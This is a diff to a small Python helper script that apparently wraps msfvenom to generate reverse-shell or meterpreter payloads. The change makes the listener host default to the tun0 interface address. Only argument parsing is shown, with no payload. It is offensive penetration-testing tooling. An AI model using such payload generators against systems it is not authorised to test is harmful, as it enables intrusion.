@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 
 import argparse
+import netifaces as ni
 
 if __name__=="__main__":
     parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
     parser.add_argument("--port", "--lport", help="LPORT", type=int, default=5566,
             dest="lport")
-    parser.add_argument("-l", "--lhost", help="LHOST", required=True)
+    parser.add_argument("-l", "--lhost", help="LHOST; defaults to tun0 IP")
     parser.add_argument("--show", help="show msfvenom command", action="store_true", default=False)
 
     payload_group = parser.add_argument_group("payload options", "specify the full payload, or enter the other variables for it to be created automatically")
@@ -17,6 +18,10 @@ if __name__=="__main__":
     payload_group.add_argument("-m", "--meterpreter", help="if set, use meterpreter payload", action="store_true", default=False)
 
     args = parser.parse_args()
+
+    if args.lhost is None:
+        args.lhost = ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+
     if args.payload:
         payload = args.payload
     else:
